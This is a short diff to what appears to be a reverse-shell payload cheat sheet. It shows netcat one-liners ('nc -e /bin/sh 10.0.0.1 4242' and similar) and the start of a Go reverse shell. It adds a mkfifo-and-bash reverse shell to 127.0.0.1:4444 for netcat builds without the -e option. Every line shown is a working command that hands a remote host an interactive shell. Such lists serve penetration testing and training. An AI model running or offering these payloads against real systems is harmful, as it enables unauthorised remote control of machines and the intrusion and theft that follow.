@@ -148,6 +148,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 nc -e /bin/sh 10.0.0.1 4242
 nc -e /bin/bash 10.0.0.1 4242
 nc -c bash 10.0.0.1 4242
+rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/bash -i 2>&1|nc 127.0.0.1 4444 >/tmp/fa  #without -e option
 ```
 
 ### Netcat OpenBsd
